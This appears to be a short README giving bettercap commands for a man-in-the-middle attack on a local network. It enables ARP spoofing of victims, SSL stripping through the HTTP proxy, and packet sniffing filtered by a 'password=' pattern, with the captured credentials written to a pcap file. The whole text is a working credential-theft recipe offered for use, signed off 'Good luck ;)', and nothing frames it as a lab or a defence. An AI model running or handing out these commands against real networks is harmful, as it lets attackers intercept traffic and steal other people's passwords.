# bettercap
![](https://github.com/nu11secur1ty/bettercap/blob/master/Logo/logo.png)
- Start:
```bash
bettercap -iface _your_interface_
```
- - Sniffing of the victim login credentials a Layer 2 Network

```bash
set http.proxy.sslstrip true
set net.sniff.verbose false
set arp.spoof.targets 0.0.0.0
set net.sniff.filter not arp (default=not arp)
set net.sniff.local true
set net.sniff.regexp .*password=.+
set net.sniff.verbose true
set net.sniff.output passwords.pcap
arp.spoof on
http.proxy on
net.sniff on
```
-----------------------------------------------------------

# Password sniff
```bash
set net.sniff.regexp .*password=.+
set net.sniff.output passwords.cap
```
# start arp spoofing attack
```bash
# arp.spoof on
net.sniff on
```
# Good luck ;)
